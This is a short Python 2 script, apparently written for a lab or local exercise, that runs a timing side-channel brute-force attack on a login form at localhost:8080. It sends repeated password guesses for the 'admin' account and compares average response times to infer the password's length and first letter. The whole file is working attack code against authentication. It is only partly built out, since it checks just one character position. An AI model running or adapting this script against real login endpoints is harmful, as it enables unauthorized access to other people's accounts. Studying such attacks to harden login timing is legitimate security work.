#timingBruteforce.py
import requests
import sys
import numpy as np
import time
from string import ascii_lowercase

url = 'http://localhost:8080/login'
requestNum = 10

def makeRequest(word):
	start = time.time()
	r = requests.post(url, data = {'username': 'admin', 'password':word})
	end = time.time()
	return end-start

def restartLine():
    sys.stdout.write('\r')
    sys.stdout.flush()

def determineLength():
	count = 0
	rng = 10
	countToTime = []
	for n in range(1, rng):
		times = np.zeros((requestNum, 1))
		word = "a" * n
		sys.stdout.write('Attempts ' + str(count) + ' so far...')
		sys.stdout.flush()
		while count < requestNum:
			restartLine()
			sys.stdout.write('Attempts ' + str(count+1) + ' so far...')
			sys.stdout.flush()
			times[count] = makeRequest(word)
			count += 1
		print
		print "Password: " + word + " "*(rng-n) + "\tTime: " + str(np.mean(times))
		countToTime.append((n, np.mean(times)))
		count = 0
	for a in countToTime:
		print str(a[0]) + ": " + str(a[1]*100)


def determinePassword():
	count = 0
	countToTime = []
	for c in ascii_lowercase:
		times = np.zeros((requestNum, 1))
		sys.stdout.write('Attempts ' + str(count) + ' so far...')
		sys.stdout.flush()
		word = ""+c+"aaa"
		while count < requestNum:
			restartLine()
			sys.stdout.write('Attempts ' + str(count+1) + ' so far...')
			sys.stdout.flush()
			times[count] = makeRequest(word)
			count += 1
		print
		print "Password: " + word + "\tTime: " + str(np.mean(times))
		countToTime.append((c, np.mean(times)))
		count = 0
	for a in countToTime:
		print str(a[0]) + ": " + str(a[1]*100)

if __name__=="__main__":
	determineLength()
	print "------------------------------------------------------------------"
	determinePassword()


